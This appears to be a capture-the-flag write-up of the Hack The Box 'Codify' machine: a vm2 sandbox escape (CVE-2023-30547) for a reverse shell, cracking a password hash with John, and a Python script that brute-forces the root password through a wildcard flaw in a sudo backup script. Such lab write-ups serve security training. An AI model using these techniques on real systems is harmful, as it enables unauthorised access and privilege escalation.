<a href="https://0xvenus.github.io" style="display:inline-block; padding:8px 12px; background:#0078d4; color:#fff; text-decoration:none; border-radius:4px;">
    ⬅ Back to Homepage
</a>


<h2>CODIFY HTB</h2>


### NMAP SCAN

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/8a6e7234-f883-4835-831b-61e6e38cfb69)

``Add codify.htb to /etc/hosts file``

visiting the url shows our target is a Node.js editor

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/43820d8b-1120-41a7-9fef-eeb654420e65)

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/8e5750d5-a53c-4997-939d-0ea60b9aba08)

And yeah we can see it's running `vm2 version 3.9.16` which is vulnerable to ``Remote code execution`` ``CVE-2023-30547``

so, a quick google search gave the [exploit](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244)

we can easily gain reverse shell by modifying the execSync funtion and setting our netcat listener

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/c5e6cc05-bfa4-45ee-8364-6f10b32018b9)

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/2735706b-e8f3-49ad-958a-6900386949fc)

### PRIVILEGE ESCALATION

Trying to read the files in joshua directory and permission was denied

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/2ab2583d-61ff-42f2-8401-627c24c3256f)

so, there's a database file in the /var/www/contact directory which contains the user joshua password hash

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/764131ac-3120-402d-9083-2bb41ded93be)

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/3120ca6f-a3d2-4699-8cc1-cfe24bd69a2a)

And yeah i was able to crack the hash using john 

```john --wordlist=/usr/share/wordlists/rockyou.txt hash```

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/30ab44ed-694d-4e19-b35f-726623d393ab) 

we can now ssh into the box as joshua to get the user flag and proceed

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/a1c9a152-907d-49bc-9c7f-eb783586c15d)

running `sudo -l` shows we can run the mysql-backup script as sudo

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/a7fdc197-aff9-45e0-a397-c0a02c46d0a2)

and yeah we can guess or brute force the first password character followed by * to bypass the password prompt. and we can also brute force every character of the password till we find all characters of the password.

```
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
```

which i was able to get the root password and su as root

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/e82c4557-2037-4e71-b037-ee45d145e655)

so, cat the root flag

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/97e615ce-991b-4153-83ce-c03ba7d63c69)



Thanks.











